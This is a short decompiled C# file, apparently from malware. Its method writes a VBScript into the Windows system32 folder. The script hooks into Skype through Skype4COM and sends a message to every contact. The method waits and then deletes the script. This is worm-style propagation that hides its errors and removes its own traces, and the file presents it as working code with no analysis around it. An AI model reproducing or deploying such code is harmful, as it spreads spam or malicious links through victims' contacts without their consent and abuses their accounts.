using System.IO;
using ns1;
using ns2;

namespace ns4;

internal sealed class Class15
{
	public static void smethod_0()
	{
		FileStream stream = new FileStream("C:\\windows\\system32\\s4c.vbs", FileMode.Create, FileAccess.Write);
		StreamWriter streamWriter = new StreamWriter(stream);
		streamWriter.BaseStream.Seek(0L, SeekOrigin.End);
		streamWriter.WriteLine("on error resume next");
		streamWriter.WriteLine("set Fruxr = WScript.CreateObject(\"Skype4COM.Skype\", \"Skype_\")");
		streamWriter.WriteLine("Fruxr.Client.Start()");
		streamWriter.WriteLine("Fruxr.Attach()");
		streamWriter.WriteLine("For Each KZN In Fruxr.Friends ");
		streamWriter.WriteLine("Fruxr.SendMessage KZN.handle," + Class2.smethod_2().method_0().vmethod_47()
			.get_Text());
		streamWriter.WriteLine("next");
		streamWriter.Close();
		Class7.Sleep(100000L);
		FileInfo fileInfo = new FileInfo("C:\\windows\\system32\\s4c.vbs");
		fileInfo.Delete();
	}
}
